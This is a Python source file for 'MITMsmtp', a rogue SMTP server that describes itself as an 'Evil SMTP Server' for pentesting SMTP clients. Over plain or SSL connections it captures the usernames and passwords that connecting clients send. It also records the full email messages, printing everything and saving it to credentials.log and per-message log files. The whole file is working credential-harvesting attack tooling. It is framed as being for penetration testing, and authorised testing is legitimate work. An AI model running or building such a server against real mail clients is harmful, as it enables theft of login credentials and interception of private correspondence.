from SMTPServer import SMTPServer
from SMTPServerSSL import SMTPServerSSL
from SMTPHandler import SMTPHandler, messages
import threading
import argparse, sys
from datetime import datetime

class MITMsmtp:
    def __init__(self, server_address, port, ssl=False, certfile=None, keyfile=None):
        self.server_address = server_address
        self.port = port
        self.ssl = ssl
        self.certfile = certfile
        self.keyfile = keyfile
        self.SMTPServer = None
        self.thread = None

    def start(self):
        if (self.thread == None):
            if (self.ssl == False):
                self.SMTPServer = SMTPServer((self.server_address, self.port), SMTPHandler)
            else:
                if (self.certfile == None or self.keyfile == None):
                    raise ValueError("Please specify a Certfile and a Keyfile when using SSL")
                self.SMTPServer = SMTPServerSSL((self.server_address, self.port), SMTPHandler, self.certfile, self.keyfile)

            self.thread = threading.Thread(target=self.SMTPServer.serve_forever)
            self.thread.start()
        else:
            raise ValueError("SMTPServer is already running")

    def stop(self):
        if (self.SMTPServer != None and self.thread != None):
            self.SMTPServer.shutdown()
            self.thread.join()
            self.thread = None
        else:
            raise ValueError("MITMsmtp is currently not running")

    def getMessageHandler(self):
        return messages

class MailLog:
    def __init__(self, directory=None):
        self.directory = directory

    def loginCallback(self, message, username, password):
        print("=== Login ===")
        print("Username: " + username)
        print("Password: " + password + "\n")
        with open(self.directory + "/credentials.log", "a+") as log:
            log.write("[%s] %s:%s (%s)\n" % (datetime.now().strftime("%d.%m.%Y %H:%M:%S"), username, password, message.client_name))

    def messageCallback(self, message):
        output = """=== Complete Message ===\nUsername  : %s\nPassword  : %s\nClient    : %s\nSender    : %s\n""" % (message.username, message.password, message.client_name, message.sender)

        recipient_count = 0
        for recipient in message.recipients:
            if recipient_count == 0:
                output += "Recipients: " + recipient
            else:
                output += "            " + recipient
            recipient_count+=1

        print(output)
        with open("%s/%s.log" % (self.directory, datetime.now().strftime("%d-%m-%Y_%H:%M:%S")), "w+") as log:
            log.write(output + "\n\n")
            log.write(message.message)

if __name__ == "__main__":
    parser=argparse.ArgumentParser(description="MITMsmtp is an Evil SMTP Server for pentesting SMTP clients to catch login credentials and mails sent over plain or SSL encrypted connections.")
    parser.add_argument('--server_address', default="0.0.0.0", help='IP Address to listen on (default: all)')
    parser.add_argument('--port', default=8587, type=int, help='Port to listen on (default: 8587)')
    parser.add_argument('--SSL', default=False, type=bool, help='Enables SSL Support (default: False)')
    parser.add_argument('--certfile', default=None, help='Certfificate for SSL Mode')
    parser.add_argument('--keyfile', default=None, help='Key for SSL Mode')
    parser.add_argument('--log', default=None, help='Directory for mails and credentials')
    args=parser.parse_args()

    log = MailLog(args.log)
    server = MITMsmtp(args.server_address, args.port, args.SSL, args.certfile, args.keyfile) #Create new SMTPServer

    messageHandler = server.getMessageHandler() #Get Message Handler
    messageHandler.registerLoginCallback(log.loginCallback) #Register callback for login
    messageHandler.registerMessageCallback(log.messageCallback) #Register callback for complete messages

    server.start() #Start SMTPServer
    try:
        input("Waiting for messages...\n")
    except KeyboardInterrupt:
        pass
    server.stop() #Stop SMTPServer
